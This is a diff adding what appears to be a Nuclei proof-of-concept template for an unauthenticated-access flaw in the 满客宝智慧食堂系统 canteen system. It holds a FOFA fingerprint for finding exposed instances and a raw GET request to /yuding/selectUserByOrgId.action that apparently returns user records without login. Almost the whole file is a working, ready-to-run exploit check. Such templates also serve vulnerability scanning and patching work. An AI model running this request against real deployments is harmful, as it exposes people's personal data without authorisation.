@@ -1,0 +1,25 @@
+id: poc-wfnt5w6b2o3if7n5
+info:
+  name: 满客宝智慧食堂系统 selectUserByOrgId 未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wfnt5w6b2o3if7n5'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wfnt5w6b2o3if7n5
+    fofa: icon_hash="-409875651"
+http:
+- raw:
+  - 'GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
